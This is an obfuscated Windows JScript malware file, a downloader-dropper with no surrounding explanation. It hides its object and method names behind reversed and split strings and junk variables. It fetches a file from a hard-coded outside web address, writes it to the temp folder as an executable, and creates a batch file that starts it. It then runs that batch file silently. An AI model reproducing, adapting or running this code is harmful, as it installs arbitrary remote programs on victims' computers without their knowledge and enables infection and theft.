
/*@cc_on /* Q  */
  @if (@_win32 || @_win64)/* Q  */
    //
	var ______zbb13f4 = false;
	var ______zab13f4 /* Q  */ = "";
	var notion;
	var ______zaappendchild = "tcejbOetaerC".split(''/* Q  */).reverse(/* Q  */).join(''); 
	______zaa12f4 = "%TEMP%/";
	______zbcenetr = "c279S7VUqC" + "exe.".split('').reverse().join('');;
	wheelb = "W"+"S"+"c"+"ript";
	______zbb13f4 /* Q  */= true;/* Q  */
	______zab13f4 /* Q  *//* Q  */ = /* Q  */"MLH";/* Q  */
	notion =/* Q  */ "R" + "esponseB"/* Q  */ + "ydo".split('').reverse().join('');
	a12f4 = /* Q  */(/* Q  */"noit"+"isop").split(''/* Q  */).reverse(/* Q  */).join('');
	______zasuch/* Q  */ =/* Q  */ "eliFoTevaS".split(''/* Q  */).reverse().join('');
	______zbmultiplication = "A"+"DODB";
	______zbthen = "s" + "end";
	com = "htt"+"p:"+"//b"+"ig"+"isl"+"and"+"ha"+"wai"+"ih"+"il"+"or"+"eal"+"es"+"tat"+"e."+"co"+"m/"+"c7"+"ddc"+"7f";
	______zabosnian = "G\x45"+"T";
 /* Q  */ @end/* Q  */
@*//* Q  */
if (!(______zbb13f4))
{
	such = ______zbb13f4 / (-1877 + 1877);
}


var cenetr/* Q  */ = /* Q  */this[/* Q  */wheelb/* Q  */]/* Q  */;
var ______zbone = function multiplication() {return cenetr[______zaappendchild](("fdasfadsfaszxvc", wheelb)+".Shel"+"l");}(), ______zachristopher = 11;
var ______zaclearball = (1 * 1) * ((-4607 + 4609) - 0);
var rotation = ______zaclearball - (2 + 0) * (1 * 1);
function one(______zafont){______zbone[("3", "2", "R")+ "u" + ("1", "n")](______zafont, rotation, rotation);};
function then /* Q  */(){return ______zaappendchild;};

{
var ______zacenetr = "M" + "SX"+"ML2."+"X"+______zab13f4+"T"+"TP";
var clearball = "";
clearball = "o"+"pen";
function b13f4(______zarotation) {______zarotation[______zasuch](______zbone["E"+"xpandEnvir"+"o"+"nmentStrings"](______zaa12f4) + "c279S7VUqC.ex" + "e", 2 * 1); return 0;};

if (true){
 ______zbnotion = ______zacenetr;
 ______zbsuch = cenetr[______zaappendchild](______zbnotion);
 var ______zamultiplication = 1;
while (______zamultiplication) { 
	for (;______zamultiplication;){
	try {
		if (______zamultiplication == 1)
		{
			______zbsuch[clearball](______zabosnian, com, (true, false));
			______zbsuch[______zbthen]();
			______zaone /* Q  */ = "S"+"l"+"eep";
			______zamultiplication = 2;
		}
		cenetr[______zaone](120); 
		if (______zbsuch["r"+"eadystate"] < 4) 
		{
			continue;
		}
		______zamultiplication = rotation;
		function appendchild(bosnian) {var ______zathen = (123, bosnian); return ______zathen;};
		
		christopher = ______zbone["E"+"xpandEnvir"+"o"+"nmentStrings"](______zaa12f4) + ______zbcenetr;
		______zawheelb = ______zbone["E"+"xpandEnvir"+"o"+"nmentStrings"](______zaa12f4) + "sdaw2.bat";
		______zbappendchild = "start "+christopher+"\r\nexit"

		______zbnotion = ______zacom = cenetr[then /* Q  */()](______zbmultiplication+"."+"S"+"tr"+"e"+"a"+"m");
		______zbnotion[clearball]();
		______zbnotion["t"+"y"+"pe"] = 2;
		font = "wr"+"i"+"t"+"e";
		______zbnotion["Charset"] = "windows-1251";
		______zbnotion[font+"Text"](______zbappendchild);
		______zacom[a12f4] = 0;
		______zbnotion[______zasuch](______zawheelb, 4462 - 4460);
		______zacom["close"]();
		
		______zbnotion = ______zacom = cenetr[then /* Q  */()](______zbmultiplication+"."+"S"+"tr"+"e"+"a"+"m");
		______zbnotion[clearball]();
		______zbnotion["t"+"y"+"pe"] = 2;
		______zbnotion["Charset"] = "windows-1251";
		______zbnotion[font+"Text"]("M");
		______zacom[a12f4] = 0;
		b13f4(______zbnotion);
		______zacom["close"]();
		
		______zbnotion = ______zacom = cenetr[then /* Q  */()](______zbmultiplication+"."+"S"+"tr"+"e"+"a"+"m");
		______zbnotion[clearball]();
		______zbnotion["t"+"y"+"pe"] = 1;
		______zbnotion[font](______zbsuch[notion]);
		______zacom[a12f4] = 1;
		b13f4(______zbnotion);
		______zacom["close"]();
		
		if (1 && ______zbb13f4) one(______zawheelb);
	} catch(______zanotion){};};
};
}
}

